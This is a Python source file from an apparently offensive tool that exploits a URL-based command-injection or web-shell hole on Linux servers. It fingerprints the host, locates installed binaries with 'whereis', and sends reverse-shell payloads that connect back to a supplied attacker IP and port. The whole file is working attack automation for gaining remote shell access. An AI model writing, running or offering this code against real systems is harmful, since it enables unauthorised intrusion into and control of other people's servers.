import urllib.parse

import requests

from data import payloads, types
from modules import logger


def execute(url: str, command: str) -> str:
    if "SHELL" not in url:
        logger.log("Invalid URL. Please make sure the formatting is correct.")
        exit()
    command_string = url.replace("SHELL", command)
    data = requests.get(command_string)
    return data.text


def find_bins(url: str, verbose: bool) -> list:
    valid = []
    bins = list(payloads.payloads.keys())
    for bin in bins:
        result = execute(url, f"whereis {bin}")
        logger.log(result, types.Status.VERBOSE, True, verbose)
        for path in result.split(" "):
            if "bin" in path and bin in path:
                valid.append({bin: path})
                logger.log(f"{bin} found at {path}", types.Status.SUCCESS)
    return valid


def reverse_connection(valid_bins: list, url: str, ip: str, port: int, verbose: bool):
    logger.log(f"Bins to test: {len(valid_bins)}")
    for bin in valid_bins:
        logger.log(f"Attempting {list(bin.keys())[0]} payloads for path {list(bin.values())[0]}", types.Status.ALERT)
        for payload in payloads.payloads[list(bin.keys())[0]]:
            cmd = urllib.parse.quote(
                payload.replace("PATHHERE", list(bin.values())[0]).replace("IPHERE", ip).replace("PORTHERE", str(port))
            )
            result = execute(url, cmd)
            logger.log(result, types.Status.VERBOSE, True, verbose)


def verify(url: str, verbose: bool) -> bool:
    data = execute(url, "uname -a")
    logger.log(data, types.Status.VERBOSE, True, verbose)
    return "linux" in data.lower()
